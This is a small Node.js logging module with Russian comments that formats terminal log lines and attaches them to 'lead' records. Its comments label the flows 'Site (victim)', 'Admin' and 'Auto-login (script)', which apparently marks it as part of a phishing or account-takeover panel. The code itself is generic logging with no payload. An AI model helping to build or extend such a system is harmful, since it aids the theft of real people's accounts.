'use strict';
const leadService = require('../services/leadService');

/**
 * Единый вид строки в терминале PM2/Node: [КАНАЛ] поток | попытка | email: действие
 * поток: Сайт (жертва), Админ (кнопки), Автовход (скрипт), Система (без лида)
 */
function formatTerminalLogLine(channel, flow, attempt, email, message) {
  const ts = new Date().toISOString();
  const ch = (channel || 'LOG').trim() || 'LOG';
  const fl = (flow || '—').trim() || '—';
  const at =
    attempt != null && String(attempt).trim() !== '' ? String(attempt).trim() : '—';
  let em = email != null ? String(email).trim() : '';
  if (em.length > 72) em = em.slice(0, 69) + '...';
  if (!em) em = '—';
  const msg = String(message || '')
    .replace(/\s+/g, ' ')
    .trim();
  return `${ts} [${ch}] ${fl} | ${at} | ${em}: ${msg}`;
}

function logTerminalFlow(channel, flow, attempt, email, message, leadId) {
  const line = formatTerminalLogLine(channel, flow, attempt, email, message);
  console.log(line);
  const id = leadId != null ? String(leadId).trim() : '';
  if (id) {
    try {
      leadService.appendLeadLogTerminal(id, line);
    } catch (_) {}
  }
}

/** Повторный запуск автоматизации для того же leadId, пока уже идёт сессия или запрещён статусом БД. */
function logDuplicateAutomationAttempt(leadId, email, reason) {
  const id = leadId != null && String(leadId).trim() ? String(leadId).trim() : '—';
  const detail = reason != null && String(reason).trim() ? String(reason).trim() : '';
  logTerminalFlow(
    'AUTO-LOGIN',
    'Система',
    '—',
    email,
    'попытка повторного запуска автоматизации отклонена: leadId=' + id + (detail ? ' · ' + detail : ''),
    id
  );
}

module.exports = { logTerminalFlow, logDuplicateAutomationAttempt, formatTerminalLogLine };
